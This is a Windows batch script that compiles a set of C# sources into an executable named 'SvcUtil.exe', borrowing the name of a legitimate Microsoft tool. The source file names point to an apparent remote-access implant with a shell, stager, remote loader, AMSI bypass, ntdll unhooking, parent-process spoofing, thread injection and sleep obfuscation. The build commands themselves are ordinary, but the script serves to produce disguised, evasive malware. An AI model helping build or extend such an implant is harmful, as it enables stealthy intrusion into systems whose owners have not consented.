@echo off
REM ============================================================
REM  Build script — no .NET SDK required
REM  Uses csc.exe from .NET Framework (pre-installed on Windows)
REM  Output: SvcUtil.exe
REM ============================================================

setlocal enabledelayedexpansion

set CONFIG=%1
if "%CONFIG%"=="" set CONFIG=Release

REM ── Find csc.exe ──────────────────────────────────────────
REM Try newest .NET Framework version first
set CSC=
for %%v in (v4.0.30319 v3.5 v2.0.50727) do (
    if exist "%SystemRoot%\Microsoft.NET\Framework64\%%v\csc.exe" (
        set CSC=%SystemRoot%\Microsoft.NET\Framework64\%%v\csc.exe
        goto :found
    )
    if exist "%SystemRoot%\Microsoft.NET\Framework\%%v\csc.exe" (
        set CSC=%SystemRoot%\Microsoft.NET\Framework\%%v\csc.exe
        goto :found
    )
)

echo [!] csc.exe not found. Ensure .NET Framework is installed.
exit /b 1

:found
echo [*] Using: %CSC%

REM ── Source files ──────────────────────────────────────────
set SOURCES=Program.cs Config.cs DynInvoke.cs Connection.cs Shell.cs ^
    IShellStream.cs Crypto.cs TlsStream.cs FileTransfer.cs ScanPatch.cs ^
    AesCrypto.cs EnvCheck.cs PayloadRunner.cs Syscall.cs ^
    RemoteLoader.cs Cleanup.cs Stager.cs AsmExec.cs AssemblyRunner.cs ^
    NtdllUnhook.cs AmsiHwBp.cs PpidSpoof.cs ThreadInjector.cs ^
    SleepObfuscation.cs

REM ── References (GAC assemblies) ──────────────────────────
set REFS=/reference:System.dll /reference:System.Core.dll ^
    /reference:System.Net.dll /reference:System.Net.Security.dll ^
    /reference:System.Security.dll

REM ── Compiler flags ───────────────────────────────────────
set FLAGS=/target:exe /platform:anycpu /nologo /utf8output /unsafe

if /I "%CONFIG%"=="Debug" (
    set FLAGS=%FLAGS% /debug+ /define:DEBUG
    echo [*] Building Debug...
) else (
    set FLAGS=%FLAGS% /optimize+ /debug-
    echo [*] Building Release...
)

REM ── Build ────────────────────────────────────────────────
"%CSC%" %FLAGS% %REFS% /out:SvcUtil.exe %SOURCES%

if %ERRORLEVEL%==0 (
    echo [+] Build successful: SvcUtil.exe
    for %%F in (SvcUtil.exe) do echo [+] Size: %%~zF bytes
) else (
    echo [-] Build failed with error code %ERRORLEVEL%
)

endlocal
